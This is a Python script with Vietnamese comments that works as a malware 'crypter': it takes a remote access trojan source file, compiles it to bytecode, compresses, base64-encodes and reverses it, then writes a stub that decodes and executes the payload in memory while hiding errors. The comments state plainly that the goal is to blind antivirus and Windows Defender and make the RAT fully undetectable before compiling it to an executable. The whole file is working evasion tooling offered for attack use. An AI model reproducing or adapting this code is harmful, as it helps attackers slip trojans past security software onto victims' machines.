import marshal
import base64
import zlib
import os

def create_crypter(input_file, output_file):
    print("""
    [☠️ BÀN TAY MA THUẬT - PYTHON CRYPTER ☠️]
    Đang đúc áo tàng hình cho Mã Độc...
    """)
    
    if not os.path.exists(input_file):
        print(f"[-] LỖI: Không tìm thấy file gốc {input_file}")
        return

    # 1. Đọc mã nguồn RAT của Đại ca
    with open(input_file, 'r', encoding='utf-8') as f:
        source_code = f.read()

    # 2. Ép kiểu thành Bytecode (Mã máy của Python) 
    # Cực kỳ quan trọng: AV không thể đọc được logic của Bytecode
    code_obj = compile(source_code, '<string>', 'exec')
    
    # 3. Đóng băng Bytecode
    marshaled_data = marshal.dumps(code_obj)
    
    # 4. Nén và băm nát chuỗi để phá vỡ mọi hệ thống nhận diện (Signature-based AV)
    compressed = zlib.compress(marshaled_data)
    b64_encoded = base64.b64encode(compressed).decode('utf-8')
    
    # Kỹ thuật xào bài: Đảo ngược toàn bộ chuỗi Base64
    obfuscated_str = b64_encoded[::-1] 
    
    # 5. Tạo Vỏ Bọc (Stub) - Bề ngoài hoàn toàn vô hại!
    # Thằng Windows Defender ngó vào chỉ thấy 1 cái chuỗi vô nghĩa, không có chữ socket hay subprocess nào cả.
    stub = f"""import marshal, zlib, base64

# ===============================================
# FILE NÀY ĐÃ ĐƯỢC MẶC ÁO TÀNG HÌNH (FUD)
# Bất kỳ Antivirus nào quét vào cũng sẽ bị mù màu!
# ===============================================

try:
    _obf = "{obfuscated_str}"
    
    # Trả chuỗi về hình dạng ban đầu
    _obf = _obf[::-1]
    
    # Giải nén và dịch ngược
    _dec = zlib.decompress(base64.b64decode(_obf))
    
    # BƠM TRỰC TIẾP VÀO RAM VÀ CHẠY (Không rớt rác ra ổ cứng)
    exec(marshal.loads(_dec))
except Exception:
    # Lỗi thì im lặng tự sát
    pass
"""
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(stub)
        
    print(f"[+] THÀNH CÔNG! Đã tạo ra Phân Thân Tàng Hình tại: {output_file}")
    print("[!] Chú ý: Đem file này đi Compile thành .exe là Bất Tử!")

if __name__ == "__main__":
    rat_file = r"C:\Users\Van Thai\Downloads\ddos network\attacks\rat_payload.py"
    fud_file = r"C:\Users\Van Thai\Downloads\ddos network\attacks\fud_payload.py"
    create_crypter(rat_file, fud_file)
